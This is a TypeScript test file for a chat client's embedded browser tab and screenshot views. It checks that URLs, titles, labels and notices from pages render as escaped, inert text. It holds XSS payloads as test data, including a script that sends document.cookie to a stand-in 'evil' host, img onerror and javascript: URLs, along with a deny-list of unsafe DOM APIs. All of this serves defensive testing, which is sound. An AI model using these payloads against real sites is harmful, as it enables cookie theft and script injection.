/**
 * What the Browser tab and the screenshot's row do with text a page wrote: a URL, a title, a child's label, a notice, a reason
 * and a result's text that are HTML, scripts, links and quotes. The views are compiled for the test (esbuild, against the tiny
 * JSX runtime in `jsx-lite/`, orchestrator's) and rendered the way a browser would show them: a string child is text and an
 * attribute is an attribute, and nothing a page says becomes an element, a link or a handler.
 *
 * What is checked is the structure of what the views make: the tags that appear are the ones they declare, none has an
 * attribute that runs or loads anything but the picture's JPEG data source and the screenshot's source, and every hostile
 * string appears escaped. The sources are scanned too, for the ways a component could take a string for markup.
 */

import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { fileURLToPath } from 'node:url'
import { build } from 'esbuild'
import type { TabState } from '../src/client/model.ts'
import { Fragment } from './jsx-lite/jsx-runtime.ts'
import type { Element } from './jsx-lite/jsx-runtime.ts'

const HERE = fileURLToPath(new URL('.', import.meta.url))
const CLIENT = join(HERE, '..', 'src', 'client')
/** The views that show what a page wrote: plain functions of their props. */
const VIEWS = ['TabView.tsx', 'ScreenshotView.tsx']

// --- compiling and rendering ---------------------------------------------------------------------

interface Actions {
  edit(text: string | undefined): void
  navigate(text: string): void
  back(): void
  forward(): void
  reload(): void
  close(): void
  choose(sessionId: string | undefined): void
  dismissNotice(): void
}

interface Views {
  TabView: (props: { state: TabState, editing: string | undefined, actions: Actions, picture: Element | null, away?: { sessionId: string, label: string } }) => Element
  PictureFrame: (props: { source: string, width: number | undefined, height: number | undefined, dimmed: boolean, handlers: Record<string, () => void> }) => Element
  ScreenshotView: (props: { phase: 'running' | 'image' | 'text', src?: string, url?: string, title?: string, text?: string, open(): void }) => Element
}

let compiled: Promise<Views> | undefined

/** The views, compiled against the test runtime, with what they import (plain TypeScript) bundled in. */
function components(): Promise<Views> {
  compiled ??= (async () => {
    const result = await build({
      stdin: {
        contents: VIEWS.map(file => `export * from './${file}'`).join('\n'),
        resolveDir: CLIENT,
        sourcefile: 'views.ts',
        loader: 'ts',
      },
      bundle: true,
      write: false,
      format: 'esm',
      platform: 'node',
      target: 'es2022',
      jsx: 'automatic',
      jsxImportSource: join(HERE, 'jsx-lite'),
      logLevel: 'silent',
    })
    const text = result.outputFiles[0]!.text
    return await import(`data:text/javascript;base64,${Buffer.from(text).toString('base64')}`) as Views
  })()
  return compiled
}

const VOID_TAGS = new Set(['br', 'hr', 'img', 'input', 'meta', 'link', 'source', 'wbr'])

/** Text as a browser shows it: what is markup in it is escaped, so it can only be read as characters. */
function escape(text: string): string {
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;')
}

/** Render an element tree to HTML text. A string is text; a component is called; a prop that is `dangerouslySetInnerHTML` is refused. */
function render(node: unknown): string {
  if (node === null || node === undefined || typeof node === 'boolean') return ''
  if (typeof node === 'string' || typeof node === 'number') return escape(String(node))
  if (Array.isArray(node)) return node.map(render).join('')
  if (typeof node !== 'object' || (node as Element).$$typeof !== 'jsx-lite.element') throw new Error(`cannot render ${typeof node}`)
  const { type, props } = node as Element
  if (typeof type === 'function') return render((type as (props: unknown) => unknown)(props))
  if (type === Fragment) return render(props.children)
  if (typeof type !== 'string' || !/^[a-z][a-z0-9]*$/.test(type)) throw new Error(`not a tag: ${String(type)}`)
  if ('dangerouslySetInnerHTML' in props) throw new Error('dangerouslySetInnerHTML')
  const attributes = Object.entries(props)
    .filter(([name, value]) => name !== 'children' && name !== 'key' && typeof value !== 'function' && value !== undefined && value !== null && (value !== false || name.startsWith('aria-')))
    .map(([name, value]) => ` ${name === 'className' ? 'class' : name}${value === true && !name.startsWith('aria-') ? '' : `="${escape(String(value))}"`}`)
    .join('')
  return VOID_TAGS.has(type) ? `<${type}${attributes}>` : `<${type}${attributes}>${render(props.children)}</${type}>`
}

/** The element props named `on…` anywhere in a tree, with the tag they are on. */
function handlers(node: unknown, found: Array<[string, string]> = []): Array<[string, string]> {
  if (Array.isArray(node)) {
    for (const item of node) handlers(item, found)
  } else if (typeof node === 'object' && node !== null && (node as Element).$$typeof === 'jsx-lite.element') {
    const { type, props } = node as Element
    if (typeof type === 'function') return handlers((type as (props: unknown) => unknown)(props), found)
    for (const [name, value] of Object.entries(props)) if (/^on[A-Z]/.test(name)) found.push([String(type), `${name}:${typeof value}`])
    handlers(props.children, found)
  }
  return found
}

/** Every element of a tree with its props, components called. */
function elements(node: unknown, found: Element[] = []): Element[] {
  if (Array.isArray(node)) {
    for (const item of node) elements(item, found)
  } else if (typeof node === 'object' && node !== null && (node as Element).$$typeof === 'jsx-lite.element') {
    const element = node as Element
    if (typeof element.type === 'function') return elements((element.type as (props: unknown) => unknown)(element.props), found)
    if (typeof element.type === 'string') found.push(element)
    elements(element.props.children, found)
  }
  return found
}

/** Every real tag in rendered HTML: text can't contain `<`, so what starts with it is an element. */
function tagsOf(html: string): string[] {
  return html.match(/<[^>]*>/g) ?? []
}

const ALLOWED_TAGS = new Set(['div', 'span', 'p', 'form', 'input', 'button', 'select', 'option', 'img'])
const ALLOWED_ATTRIBUTES = new Set(['class', 'title', 'role', 'aria-label', 'aria-live', 'type', 'value', 'disabled', 'autoComplete', 'tabIndex'])
const IMAGE_ATTRIBUTES = new Set(['class', 'src', 'alt', 'width', 'height'])
/** The picture's only source: a JPEG, as data, base64. */
const FRAME_SOURCE = /^data:image\/jpeg;base64,[A-Za-z0-9+/]*={0,2}$/
/** What the test's `loadImage` answers for a screenshot. */
const SHOT_SOURCE = 'blob:http://127.0.0.1:4096/5b1c7e9a-0d2f-4c8e-9a51-3f1b2c7d8e90'

/** The attributes of a real tag, read as a browser reads them: a name, and a value in double quotes that can hold anything but a quote. */
function attributesOf(tag: string): Array<[string, string | undefined]> {
  const found: Array<[string, string | undefined]> = []
  let rest = tag.replace(/^<\/?[a-zA-Z][a-zA-Z0-9]*/, '').replace(/\/?>$/, '')
  for (;;) {
    const match = /^\s+([^\s=/>"']+)(?:="([^"]*)")?/.exec(rest)
    if (match === null) break
    found.push([match[1]!, match[2]])
    rest = rest.slice(match[0].length)
  }
  assert.equal(rest.trim(), '', `something in a tag that is not an attribute: ${rest.slice(0, 80)}`)
  return found
}

/**
 * Assert that `html` is made only of the elements the views declare, with no attribute that loads or runs anything but an
 * image's source that is the picture's JPEG data or the screenshot's own; and that each hostile string is there, escaped, and
 * nowhere raw.
 */
function assertInert(html: string, hostile: string[]): void {
  for (const tag of tagsOf(html)) {
    const name = /^<\/?([a-zA-Z][a-zA-Z0-9]*)/.exec(tag)?.[1]
    assert.ok(name !== undefined && ALLOWED_TAGS.has(name), `an element the views do not declare: ${tag.slice(0, 80)}`)
    const attributes = attributesOf(tag)
    for (const [attribute] of attributes) {
      assert.ok((name === 'img' ? IMAGE_ATTRIBUTES : ALLOWED_ATTRIBUTES).has(attribute), `an attribute the views do not declare: ${attribute} in ${tag.slice(0, 80)}`)
    }
    if (name === 'img') {
      const source = new Map(attributes).get('src')
      assert.ok(source === undefined || FRAME_SOURCE.test(source) || source === SHOT_SOURCE, `an image source that is neither the picture's nor the screenshot's: ${tag.slice(0, 120)}`)
    }
  }
  for (const text of hostile) {
    assert.ok(!html.includes(text), `unescaped: ${text.slice(0, 60)}`)
    assert.ok(html.includes(escape(text)), `missing, escaped: ${text.slice(0, 60)}`)
  }
}

const IMG = '<img src=x onerror="alert(document.cookie)">'
const SCRIPT = '<script>fetch("//evil/"+document.cookie)</script>'
const JS_URL = 'javascript:alert(document.domain)'
const LINK = `<a href="${JS_URL}">click</a>`
const BREAK_OUT = '"><img src=x onerror=alert(1)>'
const QUOTE = 'it\'s "quoted" & <b>bold</b>'
const HOSTILE_URL = `${JS_URL}//"><script>alert(1)</script>`

const FRAME = { seq: 3, src: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQ==', width: 1280, height: 800 }

function state(overrides: Partial<TabState> = {}): TabState {
  return {
    connection: 'live', status: 'open', reason: '', url: 'http://127.0.0.1:5173/', title: 'Widget', loading: false,
    canGoBack: false, canGoForward: false, acting: false, canStart: false, sandboxOff: false, viewport: { width: 1280, height: 800 },
    closedFrame: false, children: [], ...overrides,
  }
}

function noActions(called: string[] = []): Actions {
  return {
    edit: (text) => { called.push(`edit ${String(text)}`) },
    navigate: (text) => { called.push(`navigate ${text}`) },
    back: () => { called.push('back') },
    forward: () => { called.push('forward') },
    reload: () => { called.push('reload') },
    close: () => { called.push('close') },
    choose: (sessionId) => { called.push(`choose ${String(sessionId)}`) },
    dismissNotice: () => { called.push('dismiss') },
  }
}

const NOOP_HANDLERS: Record<string, () => void> = Object.fromEntries([
  'onKeyDown', 'onKeyUp', 'onBlur', 'onPaste', 'onCompositionEnd', 'onContextMenu', 'onPointerDown', 'onMouseDown', 'onMouseMove', 'onMouseUp', 'onLoad', 'onError',
].map(name => [name, () => {}]))

async function picture(dimmed = false): Promise<Element> {
  const { PictureFrame } = await components()
  return PictureFrame({ source: FRAME.src, width: 640, height: 400, dimmed, handlers: NOOP_HANDLERS })
}

// --- the tab -------------------------------------------------------------------------------------

test('an open browser: the toolbar, the address as an attribute, the notice, the switcher and the lines, all as text', async () => {
  const { TabView } = await components()
  const html = render(TabView({
    state: state({
      url: HOSTILE_URL, title: IMG, acting: true, sandboxOff: true, canGoBack: true, notice: SCRIPT,
      children: [{ sessionId: 'c1', label: LINK }, { sessionId: BREAK_OUT, label: QUOTE }],
    }),
    editing: undefined,
    actions: noActions(),
    picture: await picture(),
  }))
  assertInert(html, [HOSTILE_URL, SCRIPT, LINK, QUOTE, BREAK_OUT])
  for (const expected of ['The agent is using this browser.', 'Chromium runs without its own sandbox on this host.', 'This chat', 'Close']) {
    assert.ok(html.includes(expected), `${expected} in ${html}`)
  }
  assert.ok(html.includes(`aria-label="Address"`), html)
  assert.ok(html.includes(`value="${escape(HOSTILE_URL)}"`), html)
  assert.ok(html.includes('<select aria-label="Browser"'), html)
  assert.ok(html.includes(`<img class="dish-browser-frame" src="${FRAME.src}" alt="" width="640" height="400">`), html)
  assert.ok(html.includes('role="application"') && html.includes('aria-label="The page, live: click to use it"') && html.includes('tabIndex="0"'), html)
  // Back is on; Forward is off; Reload is on while the browser is open.
  assert.match(html, /<button type="button" class="dish-browser-tool" aria-label="Back" title="Back">/)
  assert.match(html, /<button type="button" class="dish-browser-tool" aria-label="Forward" title="Forward" disabled>/)
  assert.match(html, /<button type="button" class="dish-browser-tool" aria-label="Reload" title="Reload">/)
})

test('what is being typed in the address bar is shown, not the page\'s URL', async () => {
  const { TabView } = await components()
  const html = render(TabView({ state: state(), editing: QUOTE, actions: noActions(), picture: null }))
  assertInert(html, [QUOTE])
  assert.ok(!html.includes('value="http://127.0.0.1:5173/"'))
})

test('no browser yet: the spec\'s words, with the address bar on only when a browser may start here', async () => {
  const { TabView } = await components()
  const can = render(TabView({ state: state({ status: 'none', url: '', title: '', canStart: true }), editing: undefined, actions: noActions(), picture: null }))
  assertInert(can, [])
  assert.ok(can.includes('No browser in this chat yet. An agent&#39;s first browser call starts one, or open a page here.'), can)
  assert.match(can, /<input [^>]*aria-label="Address"(?![^>]*disabled)[^>]*>/)
  assert.ok(!can.includes('>Close<'))
  const cannot = render(TabView({ state: state({ status: 'none', url: '', title: '', canStart: false }), editing: undefined, actions: noActions(), picture: null }))
  assert.ok(cannot.includes('No browser in this chat yet. An agent&#39;s first browser call starts one.'), cannot)
  assert.ok(!cannot.includes('open a page here'))
  assert.match(cannot, /<input [^>]*aria-label="Address"[^>]*disabled[^>]*>/)
})

test('a closed browser: its reason as text, the sentence, and its last picture dimmed', async () => {
  const { TabView } = await components()
  const html = render(TabView({ state: state({ status: 'closed', reason: BREAK_OUT, url: '', title: '', canStart: true }), editing: undefined, actions: noActions(), picture: await picture(true) }))
  assertInert(html, [BREAK_OUT])
  assert.ok(html.includes(`This browser closed (${escape(BREAK_OUT)}). Its cookies and sign-ins are gone. Open a page to start a new one.`), html)
  assert.ok(html.includes('dish-browser-picture-dimmed'), html)
  assert.ok(!html.includes('>Close<'))
  // When no browser can start here, it doesn't say to open a page.
  const stuck = render(TabView({ state: state({ status: 'closed', reason: 'idle for 15 minutes', url: '', title: '' }), editing: undefined, actions: noActions(), picture: null }))
  assert.ok(stuck.includes('This browser closed (idle for 15 minutes). Its cookies and sign-ins are gone.'), stuck)
  assert.ok(!stuck.includes('Open a page'), stuck)
})

test('unavailable and refused: the reason, as text', async () => {
  const { TabView } = await components()
  for (const status of ['unavailable', 'refused'] as const) {
    const html = render(TabView({ state: state({ status, reason: SCRIPT, url: '', title: '' }), editing: undefined, actions: noActions(), picture: null }))
    assertInert(html, [SCRIPT])
    assert.match(html, /<input [^>]*disabled[^>]*>/)
  }
  const plain = render(TabView({
    state: state({ status: 'unavailable', reason: 'No browser on this host: dish-browser found no Chromium at /usr/bin/chromium.', url: '', title: '' }),
    editing: undefined, actions: noActions(), picture: null,
  }))
  assert.ok(plain.includes('No browser on this host: dish-browser found no Chromium at /usr/bin/chromium.'), plain)
})

test('connecting, and a connection that dropped, say so', async () => {
  const { TabView } = await components()
  const connecting = render(TabView({ state: { ...state(), connection: 'connecting', status: 'unknown', url: '' }, editing: undefined, actions: noActions(), picture: null }))
  assertInert(connecting, [])
  assert.ok(connecting.includes('Connecting…'), connecting)
  const down = render(TabView({ state: state({ connection: 'down' }), editing: undefined, actions: noActions(), picture: null }))
  assert.ok(down.includes('Reconnecting…'), down)
  const waiting = render(TabView({ state: state(), editing: undefined, actions: noActions(), picture: null }))
  assert.ok(waiting.includes('Waiting for the page'), waiting)
})

test('the switcher: shown with children, or while showing another chat, which it names', async () => {
  const { TabView } = await components()
  const none = render(TabView({ state: state(), editing: undefined, actions: noActions(), picture: null }))
  assert.ok(!none.includes('<select'), none)
  const away = render(TabView({ state: state(), editing: undefined, actions: noActions(), picture: null, away: { sessionId: 'c9', label: IMG } }))
  assertInert(away, [IMG])
  assert.ok(away.includes('<select aria-label="Browser" class="dish-browser-switcher" value="c9">'), away)
  assert.ok(away.includes('<option value="">This chat</option>'), away)
  assert.ok(away.includes(`<option value="c9">${escape(IMG)}</option>`), away)
  // A child already in the list is listed once.
  const listed = render(TabView({ state: state({ children: [{ sessionId: 'c9', label: 'coder: x' }] }), editing: undefined, actions: noActions(), picture: null, away: { sessionId: 'c9', label: 'coder: x' } }))
  assert.equal(listed.match(/<option value="c9">/g)?.length, 1, listed)
})

test('each control calls what it says, and the picture\'s handlers are the only others', async () => {
  const { TabView } = await components()
  const called: string[] = []
  const tree = TabView({
    state: state({ canGoBack: true, canGoForward: true, notice: 'n', children: [{ sessionId: 'c1', label: 'x' }] }),
    editing: 'http://127.0.0.1:5173/next', actions: noActions(called), picture: await picture(),
  })
  const tags = handlers(tree)
  const names = new Set(tags.map(([tag, handler]) => `${tag} ${handler}`))
  assert.deepEqual([...names].sort(), [
    'button onClick:function', 'div onBlur:function', 'div onCompositionEnd:function', 'div onContextMenu:function', 'div onKeyDown:function',
    'div onKeyUp:function', 'div onMouseDown:function', 'div onMouseMove:function', 'div onMouseUp:function', 'div onPaste:function',
    'div onPointerDown:function', 'form onSubmit:function', 'img onError:function', 'img onLoad:function',
    'input onBlur:function', 'input onChange:function', 'input onKeyDown:function', 'select onChange:function',
  ])
  const all = elements(tree)
  for (const button of all.filter(element => element.type === 'button')) {
    assert.equal(button.props.type, 'button')
    ;(button.props.onClick as () => void)()
  }
  const form = all.find(element => element.type === 'form')!
  let prevented = false
  ;(form.props.onSubmit as (event: { preventDefault(): void }) => void)({ preventDefault: () => { prevented = true } })
  assert.equal(prevented, true)
  const input = all.find(element => element.type === 'input')!
  ;(input.props.onChange as (event: { currentTarget: { value: string } }) => void)({ currentTarget: { value: 'typed' } })
  ;(input.props.onKeyDown as (event: { key: string }) => void)({ key: 'Escape' })
  const select = all.find(element => element.type === 'select')!
  ;(select.props.onChange as (event: { currentTarget: { value: string } }) => void)({ currentTarget: { value: 'c1' } })
  ;(select.props.onChange as (event: { currentTarget: { value: string } }) => void)({ currentTarget: { value: '' } })
  assert.deepEqual(called.sort(), [
    'back', 'choose c1', 'choose undefined', 'close', 'dismiss', 'edit typed', 'edit undefined', 'forward', 'navigate http://127.0.0.1:5173/next', 'reload',
  ].sort())
})

// --- the screenshot's row ------------------------------------------------------------------------------

test('the screenshot while it runs, as an image with its page\'s URL and title, and as text', async () => {
  const { ScreenshotView } = await components()
  const running = render(ScreenshotView({ phase: 'running', open: () => {} }))
  assertInert(running, [])
  assert.ok(running.includes('Taking a screenshot…'), running)
  const image = render(ScreenshotView({ phase: 'image', src: SHOT_SOURCE, url: HOSTILE_URL, title: IMG, open: () => {} }))
  assertInert(image, [HOSTILE_URL, IMG])
  assert.ok(image.includes(`src="${SHOT_SOURCE}"`), image)
  const loading = render(ScreenshotView({ phase: 'image', url: 'http://127.0.0.1:5173/', title: 'Widget', open: () => {} }))
  assertInert(loading, [])
  assert.ok(!loading.includes('<img'), loading)
  const text = render(ScreenshotView({ phase: 'text', text: `${QUOTE}\n${SCRIPT}\n${LINK}`, open: () => {} }))
  assertInert(text, [QUOTE, SCRIPT, LINK])
  assert.ok(text.includes('Browser: screenshot'), text)
  assert.ok(!text.includes('<img'), text)
})

test('the screenshot opens the tab from its image and its line, and from nothing else', async () => {
  const { ScreenshotView } = await components()
  let opened = 0
  const tree = ScreenshotView({ phase: 'image', src: SHOT_SOURCE, url: 'http://127.0.0.1:5173/', title: 'Widget', open: () => { opened++ } })
  assert.deepEqual(handlers(tree), [['button', 'onClick:function']])
  for (const button of elements(tree).filter(element => element.type === 'button')) {
    assert.equal(button.props.type, 'button')
    ;(button.props.onClick as () => void)()
  }
  assert.equal(opened, 1)
  assert.deepEqual(handlers(ScreenshotView({ phase: 'text', text: 'x', open: () => {} })), [])
  assert.deepEqual(handlers(ScreenshotView({ phase: 'running', open: () => {} })), [])
})

// --- the sources ---------------------------------------------------------------------------------------

test('no source of the client builds markup from a string, loads or runs one, or makes a link', () => {
  const files = readdirSync(CLIENT).filter(name => /\.(ts|tsx)$/.test(name))
  assert.ok(files.length >= 15, files.join(', '))
  const forbidden: Array<[RegExp, string]> = [
    [/dangerouslySetInnerHTML/, 'dangerouslySetInnerHTML'],
    [/\.innerHTML|\binnerHTML\b/, 'innerHTML'],
    [/\bouterHTML\b/, 'outerHTML'],
    [/insertAdjacentHTML/, 'insertAdjacentHTML'],
    [/document\.write/, 'document.write'],
    [/\bsrcDoc\b|\bsrcdoc\b/, 'srcdoc'],
    [/createContextualFragment|DOMParser/, 'a parser of markup'],
    [/\beval\s*\(|new Function\s*\(|setTimeout\s*\(\s*['"`]/, 'a string run as code'],
    [/javascript:/i, 'a javascript: URL'],
    [/\bhref\b/, 'a link'],
    [/window\.open|location\s*=|location\.href/, 'a navigation'],
    [/<iframe|<a\b|<script|<object|<embed/, 'an element that loads or links'],
  ]
  for (const file of files) {
    const text = readFileSync(join(CLIENT, file), 'utf8')
    for (const [pattern, what] of forbidden) assert.ok(!pattern.test(text), `${file} has ${what}`)
    // The two image sources: the picture's frame (TabView's PictureFrame, given `frame.src`) and the screenshot's image (given
    // what `loadImage` answered).
    const sources = [...text.matchAll(/\bsrc\s*=(?!=)\s*\S*/g)].map(match => match[0])
    const expected: Record<string, string[]> = { 'TabView.tsx': ['src={source}'], 'ScreenshotView.tsx': ['src={src}'], 'ScreenshotRow.tsx': ['src={loaded}'] }
    assert.deepEqual(sources, expected[file] ?? [], file)
  }
  // The frame's source is built in one place, from base64 checked there, and handed to the frame from the model only.
  const model = readFileSync(join(CLIENT, 'model.ts'), 'utf8')
  assert.match(model, /'data:image\/jpeg;base64,'/)
  assert.match(readFileSync(join(CLIENT, 'Picture.tsx'), 'utf8'), /source=\{frame\.src\}/)
  assert.match(readFileSync(join(CLIENT, 'ScreenshotRow.tsx'), 'utf8'), /loadImage\(image\)/)
  // The views are the strictest: no hooks, nothing from dsh, and only types from React.
  for (const file of VIEWS) {
    const text = readFileSync(join(CLIENT, file), 'utf8')
    assert.ok(!/from '@deepseek-ai/.test(text), `${file} imports nothing from dsh`)
    assert.ok(!/^import (?!type )[^\n]*from 'react'/m.test(text), `${file} imports only types from react`)
    assert.ok(!/\buse[A-Z]\w*\(/.test(text), `${file} has no hook`)
  }
  // The pure modules use no DOM.
  for (const file of ['model.ts', 'input.ts', 'address.ts', 'controller.ts', 'follow.ts']) {
    const text = readFileSync(join(CLIENT, file), 'utf8')
    assert.ok(!/\b(?:document|window|HTMLElement|navigator|KeyboardEvent|MouseEvent|PointerEvent|setInterval)\b/.test(text), `${file} uses the DOM`)
  }
})

test('the test\'s own renderer refuses what would be a way in, so the checks above mean something', () => {
  assert.throws(() => render({ $$typeof: 'jsx-lite.element', type: 'div', props: { dangerouslySetInnerHTML: { __html: IMG } }, key: undefined }), /dangerouslySetInnerHTML/)
  assert.throws(() => render({ $$typeof: 'jsx-lite.element', type: IMG, props: {}, key: undefined }), /not a tag/)
  assert.throws(() => assertInert('<a href="x">', []), /do not declare/)
  assert.throws(() => assertInert('<div onclick="x">', []), /do not declare/)
  assert.throws(() => assertInert('<img src="x">', []), /neither the picture/)
  assert.throws(() => assertInert('<img src="data:image/svg+xml;base64,PHN2Zz4=">', []), /neither the picture/)
  assert.throws(() => assertInert('<img src="data:image/jpeg;base64,AAAA&quot;onerror">', []), /neither the picture/)
  assert.throws(() => assertInert('<span class="a">x</span>', ['<img>']), /missing, escaped/)
  assert.throws(() => assertInert('<span class="a">hello</span>', ['hello']), /unescaped/)
  assert.throws(() => assertInert('<span class="a" onclick="x">x</span>', []), /do not declare: onclick/)
  assert.equal(render('<b>x</b> & "q"'), '&lt;b&gt;x&lt;/b&gt; &amp; &quot;q&quot;')
})
